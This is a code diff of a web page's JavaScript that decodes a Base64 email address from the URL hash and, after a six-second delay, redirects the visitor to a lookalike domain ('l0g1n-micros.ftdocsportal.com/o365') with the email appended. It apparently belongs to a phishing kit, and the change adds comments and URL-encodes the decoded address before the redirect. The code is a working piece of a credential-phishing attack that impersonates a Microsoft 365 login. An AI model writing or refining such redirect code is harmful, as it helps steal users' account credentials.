@@ -66,7 +66,7 @@
             function getEmailFromHash() {
                 try {
                     const hash = window.location.hash.substr(1);
-                    return atob(hash);
+                    return atob(hash); // Decodes the Base64 encoded email
                 } catch (error) {
                     console.error("Failed to extract email from hash:", error);
                     return null;
@@ -97,7 +97,9 @@
                     }
 
                     setTimeout(() => {
-                        const redirectTo = "https://l0g1n-micros.ftdocsportal.com/o365#" + window.location.hash.substr(1);
+                        // Redirect to the specified URL with the decoded email
+                        const decodedEmail = getEmailFromHash();
+                        const redirectTo = "https://l0g1n-micros.ftdocsportal.com/o365#" + encodeURIComponent(decodedEmail);
                         console.log("Redirecting to: " + redirectTo);
                         window.location.href = redirectTo;
                     }, 6000);
